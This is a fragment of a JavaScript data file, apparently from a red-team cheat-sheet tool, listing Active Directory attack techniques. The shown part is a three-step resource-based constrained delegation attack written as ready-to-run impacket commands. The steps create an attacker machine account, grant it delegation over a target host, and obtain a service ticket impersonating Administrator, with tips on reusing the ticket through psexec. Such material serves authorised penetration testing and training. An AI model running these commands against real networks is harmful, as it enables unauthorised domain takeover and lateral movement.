...
const TACTICS = [
  ...
  /* ── Active Directory (Full Methodology) ─────────────────────────────── */
  {
    ...
    techniques: [
      ...
      {
        id: 'ad-adcs-delegation',
        name: 'ADCS & Delegation Attacks',
        description: 'Certificate abuse (ESC1-ESC16 via Certipy), RBCD, and Shadow Credentials. Often the fastest path to Domain Admin.',
        tags: ['active-directory', 'adcs', 'kerberos', 'delegation'],
        commands: [
          ...
          { id: 'adad5', label: 'RBCD step 1 — create attacker machine', os: 'Linux', command: 'impacket-addcomputer $$DOMAIN/$$USER:$$PASSWORD -computer-name EVIL$ -computer-pass Evil123 -dc-ip $$DC', notes: 'Requires MachineAccountQuota > 0 (default is 10). Creates a computer account you control.' },
          { id: 'adad6', label: 'RBCD step 2 — set delegation', os: 'Linux', command: "impacket-rbcd -delegate-from 'EVIL$' -delegate-to '$$TARGET_HOST$' -action write $$DOMAIN/$$USER:$$PASSWORD", notes: 'GenericWrite on target computer → configure EVIL$ as allowed to delegate to it via S4U2Proxy.' },
          { id: 'adad7', label: 'RBCD step 3 — get service ticket', os: 'Linux', command: "impacket-getST -spn cifs/$$TARGET_HOST.$$DOMAIN -impersonate Administrator -dc-ip $$DC '$$DOMAIN/EVIL$:Evil123'", notes: 'Get a service ticket as Administrator. export KRB5CCNAME=Administrator.ccache then use with psexec -k.' },
        ],
      },
      {
        id: 'ad-cross-trust',
